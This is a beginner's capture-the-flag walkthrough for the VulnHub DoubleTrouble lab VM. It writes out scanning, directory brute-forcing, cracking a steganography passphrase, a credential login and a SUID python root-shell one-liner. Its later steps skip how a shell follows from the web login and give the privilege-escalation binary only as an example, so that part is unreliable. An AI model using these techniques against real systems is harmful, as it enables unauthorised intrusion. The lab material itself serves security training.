# 🕵️‍♂️ CTF-DoubleTrouble-Machine Walkthrough  

This walkthrough provides step-by-step guidance to complete the **DoubleTrouble CTF machine (VulnHub)**.  
It is beginner-friendly and demonstrates **reconnaissance, enumeration, exploitation using steganography, credential extraction, privilege escalation, and root flag capture**.  

---

## 📑 Table of Contents
1. [Introduction](#-introduction)  
2. [Prerequisites](#-prerequisites)  
3. [Reconnaissance](#-reconnaissance)  
   - [3.1 Getting Attacker and Target IP Addresses](#31-getting-attacker-and-target-ip-addresses)  
   - [3.2 Port Scanning with Nmap](#32-port-scanning-with-nmap)  
4. [Enumeration & Vulnerability Discovery](#-enumeration--vulnerability-discovery)  
5. [Exploitation: Hidden Files & Steganography](#-exploitation-hidden-files--steganography)  
6. [Credential Extraction and Login](#-credential-extraction-and-login)  
7. [Privilege Escalation & Root Flag](#-privilege-escalation--root-flag)  
8. [Conclusion & Next Steps](#-conclusion--next-steps)  

---

## 📘 Introduction  
This guide demonstrates how to enumerate and exploit the **DoubleTrouble machine**.  
We will cover:  
- Reconnaissance  
- Vulnerability discovery  
- Exploiting hidden files using **steganography**  
- Credential extraction  
- Privilege escalation to root  

---

## 🛠️ Prerequisites  
- **DoubleTrouble VM** imported and running in **VirtualBox/VMware**  
- **Kali Linux** machine on the same **NAT network**  
- Completed setup steps in [Environment_Setup.md](./Environment_Setup.md)  

---

## 🔍 Reconnaissance  

### 3.1 Getting Attacker and Target IP Addresses  

Check your attacker machine’s IP:  
```bash
ip a
➡️ Look for the IP on the eth0 interface (e.g., 10.0.2.5).
Discover the target VM’s IP using Nmap ping sweep:

nmap -sn 10.0.2.5/24
Alternatively, use Netdiscover for ARP scans:
sudo netdiscover -i eth0 -r 10.0.2.5/24
-i : Select network interface
-r : Range/subnet to scan
✅ Result: Target machine’s IP found → 10.0.2.4.
3.2 Port Scanning with Nmap
Run a full port scan with service/version detection:
nmap -p- -n -vvv -sCV 10.0.2.4
-p- → Scan all 65535 ports
-n → No DNS resolution
-vvv → Very verbose output
-sCV → Run default scripts & version detection
📸 Screenshot: Add results screenshot here → screenshots/nmap_results.png
Sample Output:

22/tcp   open  ssh
80/tcp   open  http
🧩 Enumeration & Vulnerability Discovery
Visit the target in your browser:
http://10.0.2.4/
You’ll see a qdPM | Login page.
➡️ Try wrong credentials — you get error messages hinting at weak handling.

Brute-force hidden directories using dirb:

dirb http://10.0.2.4/
Discovered Directories:
/backups/
/batch/
/core/
/css/
/images/
/install/
/js/
/secret/    <-- important!
/uploads/
🎭 Exploitation: Hidden Files & Steganography
Navigate to /secret/ and download the suspicious file:
wget http://10.0.2.4/secret/doubletrouble.jpg
Try extracting hidden data:
steghide --extract -sf doubletrouble.jpg
If prompted for a passphrase, crack it using stegcracker:
stegcracker doubletrouble.jpg /usr/share/wordlists/rockyou.txt
Output:
Password found: 92camaro
Now extract the hidden file:
steghide --extract -sf doubletrouble.jpg
# Enter password: 92camaro
View extracted credentials:
cat creds.txt
Expected Output:
otisrush@localhost.com
otis666
🔑 Credential Extraction and Login
Return to login page:
http://10.0.2.4/
Use the credentials:
Username: otisrush@localhost.com
Password: otis666
📸 Screenshot: Add login/foothold screenshot → screenshots/foothold.png
🛡️ Privilege Escalation & Root Flag
Once logged in as user, enumerate the system for privilege escalation.
Check user privileges:

id
sudo -l
Search for SUID binaries:
find / -perm -4000 2>/dev/null
You may find a vulnerable binary (example: /usr/bin/python with SUID bit set).
Exploit it for root shell:
python -c 'import os; os.setuid(0); os.system("/bin/bash")'
Confirm root access:
whoami
➡️ Output: root
Capture the root flag:

cat /root/root.txt
📸 Screenshot: Add privilege escalation screenshot → screenshots/privilege_escalation.png
🏁 Conclusion & Next Steps
🎉 You successfully gained root access on the DoubleTrouble machine using:
Reconnaissance with Nmap
Directory brute-forcing
Steganography to extract hidden credentials
Web login → user foothold
Privilege escalation to root
Next Steps:
Practice automating parts of this process.
Try alternative privilege escalation methods.
Explore post-exploitation activities (persistence, pivoting, etc.).
Document everything in Project_Report.pdf.
💡 Tips
If any command fails, check network & IP addresses.
Explore man pages for tool usage:
man nmap
man dirb
man steghide
